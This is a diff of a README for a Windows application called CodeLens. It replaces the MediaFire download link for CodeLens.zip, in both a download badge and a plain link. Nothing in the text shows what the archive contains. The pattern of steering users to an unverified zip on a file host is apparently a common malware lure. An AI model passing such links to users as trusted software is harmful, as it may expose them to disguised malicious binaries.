@@ -29,14 +29,14 @@ Thank you for your interest in CodeLens!
 Get the packaged Windows application using the download link below.
 
 <p align="center">
-  <a href="[https://www.mediafire.com/file/stqrwp7xgndtenm/CodeLens.zip/file](https://www.mediafire.com/file/mx4vn8oziwvs7zg/CodeLens.zip/file)">
+  <a href="[https://www.mediafire.com/file/mx4vn8oziwvs7zg/CodeLens.zip/file](https://www.mediafire.com/file/mx4vn8oziwvs7zg/CodeLens.zip/file)">
     <img src="https://img.shields.io/badge/DOWNLOAD-CODELENS%20FOR%20WINDOWS-00BFFF?style=for-the-badge&logo=windows&logoColor=white">
   </a>
 </p>
 
 <p align="center">
   <strong>Download:</strong><br>
-  <a href="https://www.mediafire.com/file/stqrwp7xgndtenm/CodeLens.zip/file">CodeLens.zip — MediaFire</a>
+  <a href="https://www.mediafire.com/file/mx4vn8oziwvs7zg/CodeLens.zip/file">CodeLens.zip — MediaFire</a>
 </p>
 
 ## What's Included?
